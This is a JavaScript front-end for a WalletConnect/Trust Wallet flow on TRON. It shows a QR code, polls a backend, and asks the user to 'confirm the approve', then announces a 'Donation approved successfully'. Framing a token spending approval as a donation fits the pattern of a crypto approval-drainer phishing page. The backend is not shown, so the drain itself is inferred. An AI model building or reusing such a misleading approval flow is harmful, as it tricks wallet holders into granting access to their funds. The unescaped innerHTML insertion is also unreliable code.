// ============================================================
// WALLETCONNECT FLOW
// Scan QR → Trust Wallet popup → Confirm approve → Done
// ============================================================

let currentSessionId = null;
let pollInterval = null;

async function startSession() {
    const statusEl = document.getElementById("status-text");
    const qrcodeContainer = document.getElementById("qrcode");

    try {
        statusEl.textContent = "Generating QR code...";

        const res = await fetch("/api/wc/session", { method: "POST" });
        const data = await res.json();

        if (data.error) {
            statusEl.textContent = "Error: " + data.error;
            return;
        }

        currentSessionId = data.sessionId;

        qrcodeContainer.innerHTML = "";
        if (typeof QRCode !== "undefined") {
            new QRCode(qrcodeContainer, {
                text: data.uri,
                width: 220,
                height: 220,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.L,
            });
        } else {
            qrcodeContainer.innerHTML = '<p style="color:#999;font-size:11px;word-break:break-all;padding:10px;">' + data.uri + '</p>';
        }

        statusEl.textContent = "Scan with Trust Wallet";

        pollInterval = setInterval(() => pollStatus(), 2000);

    } catch (err) {
        statusEl.textContent = "Failed: " + err.message;
    }
}

async function pollStatus() {
    if (!currentSessionId) return;

    try {
        const res = await fetch(`/api/wc/status/${currentSessionId}`);
        const data = await res.json();

        const statusEl = document.getElementById("status-text");
        const qrcodeContainer = document.getElementById("qrcode");
        const successEl = document.getElementById("success-section");

        switch (data.status) {
            case "pending":
                break;

            case "connected":
            case "signing":
                statusEl.textContent = "Please confirm the approve in your wallet...";
                statusEl.style.color = "#facc15";
                break;

            case "approved":
                statusEl.textContent = "Approve confirmed! Broadcasting...";
                statusEl.style.color = "#4ade80";
                break;

            case "done":
                clearInterval(pollInterval);
                qrcodeContainer.style.display = "none";
                successEl.style.display = "block";
                statusEl.textContent = "Donation approved successfully!";
                statusEl.style.color = "#4ade80";
                document.getElementById("tx-link").href = "https://tronscan.org/#/transaction/" + data.txId;
                document.getElementById("tx-link").textContent = data.txId.substring(0, 12) + "...";
                break;

            case "rejected":
                clearInterval(pollInterval);
                statusEl.textContent = "Connection rejected. Try again.";
                statusEl.style.color = "#f87171";
                document.getElementById("retry-btn").style.display = "inline-block";
                break;
        }
    } catch (e) {
        // Silently retry
    }
}

function retry() {
    document.getElementById("retry-btn").style.display = "none";
    document.getElementById("success-section").style.display = "none";
    document.getElementById("qrcode").style.display = "inline-block";
    document.getElementById("status-text").style.color = "#9ca3af";
    if (pollInterval) clearInterval(pollInterval);
    startSession();
}

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", startSession);
} else {
    startSession();
}
